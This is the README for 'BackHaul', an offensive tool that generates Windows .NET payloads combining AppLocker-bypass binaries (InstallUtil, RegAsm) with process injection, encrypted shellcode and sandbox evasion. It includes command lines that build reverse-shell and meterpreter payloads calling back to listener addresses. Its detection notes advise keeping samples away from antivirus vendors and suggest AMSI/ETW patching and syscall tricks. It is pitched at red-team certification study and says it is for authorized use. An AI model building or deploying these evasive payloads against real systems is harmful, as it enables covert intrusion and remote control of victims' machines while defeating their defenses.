# BackHaul

Generate Windows .NET payloads that combine **Living-off-the-Land AppLocker bypass binaries** (InstallUtil, RegAsm/Regsvcs) with **process-injection techniques**, plus standalone process-injection variants with built-in AV/sandbox evasion.

## Who this is for

A practical aid for security professionals — particularly anyone studying for or working through certifications that cover payload crafting, AppLocker bypass, AV evasion, and process injection:

- **OSEP** (Offensive Security Experienced Penetration tester / PEN-300) — AV evasion, .NET loaders, process injection
- **OSCP** (Offensive Security Certified Professional) — payload generation and delivery
- **CRTP** (Certified Red Team Professional) — Active Directory lab payload delivery
- **CRTE** (Certified Red Team Expert) — internal AD red team operations
- **CRTO** (Certified Red Team Operator) — payload crafting + AV/AppLocker evasion
- Red teamers, penetration testers, malware analysts, and detection engineers studying offensive .NET tradecraft

> **Authorized use only.** This tool is intended for authorized engagements, lab environments (Altered Security, OffSec PG, HackTheBox Pro Labs, etc.), and security research. Do not use against systems you do not have explicit permission to test.

## Features

- **LOLBin AppLocker bypass templates** — `InstallUtil`, `RegAsm`/`Regsvcs`
- **Standalone injection variants** — `ProcessHollow`, `ProcessHollow2`, `NTMapInjection-AV`, `NativeProcInjection-AV`
- **Pluggable injection techniques** (InstallUtil/RegAsm) — `Shellcode-Loader`, `Process-Hollowing`, easily extended via `cs_templates/injection_techniques.yml`
- **Per-build randomized XOR key** for shellcode encryption — defeats trivial cross-build static signatures
- **Runtime string obfuscation** — process names (`svchost.exe`, `explorer`) decoded at runtime instead of sitting in the binary as cleartext
- **Sandbox / AV evasion** in `*-AV` templates — sleep-skew detection
- **MSF mode** — generate msfvenom payloads inline
- **Custom shellcode mode** — drop in your own hex shellcode (Donut, sRDI, micr0_shell, etc.)

## Supported binaries

| Name | Type | AppLocker bypass | Injection |
|------|------|------------------|-----------|
| `InstallUtil` | Loader | ✅ | Pluggable via `-t` |
| `RegAsm` | Loader | ✅ | Pluggable via `-t` |
| `ProcessHollow` | Standalone | — | Process Hollowing |
| `ProcessHollow2` | Standalone | — | Process Hollowing (variant) |
| `NTMapInjection-AV` | Standalone | — | NtMapViewOfSection (shared section, W^X) |
| `NativeProcInjection-AV` | Standalone | — | Native NT API + RW→RX flip |

## Example Usage

The script can be used in two modes:

- **MSF Mode**

Parameters like listener IP, listener port and MSF payload type are specified, based on which an MSFVenom payload is generated and embedded in the final binary.
```
python backhaul.py -b InstallUtil,RegAsm -lh 127.0.0.1 -lp 8080 --payload windows/x64/shell_reverse_tcp
```

- **Custom Shellcode Mode**

Custom shellcode created using 3rd party tools like micr0_shell (https://github.com/senzee1984/micr0_shell) or hand-crafted shellcode is supplied directly. The shellcode is embedded in the final payload binary.
```
python backhaul.py -b InstallUtil,RegAsm --custom --hex-shellcode 4831d265488b42604<SNIP>c9515151514989c84989c9ffd0
```

- **AV-evasion injection variants**
```
python backhaul.py -b NTMapInjection-AV -lh 192.168.1.10 -lp 443 --payload windows/x64/shell_reverse_tcp
python backhaul.py -b NativeProcInjection-AV -lh 192.168.1.10 -lp 443 --payload windows/x64/meterpreter/reverse_tcp
```

- **Selecting an injection technique** (InstallUtil/RegAsm only)
```
python backhaul.py -b InstallUtil -t Process-Hollowing -lh 10.0.0.1 -lp 4444 --payload windows/x64/meterpreter/reverse_tcp
```

## Detection notes

- **Do not iterate against VirusTotal.** Every upload distributes your sample to all participating vendors and burns the build. Use no-distribute scanners (`antiscan.me`, `kleenscan.com`) or local tools (`DefenderCheck`, `ThreatCheck`, `avred`) instead.
- msfvenom shellcode is heavily signatured — custom shellcode (Donut, sRDI) typically scores much lower out of the box.
- For deeper evasion, consider AMSI/ETW patching, indirect/direct syscalls, and dynamic API resolution via PEB walking.
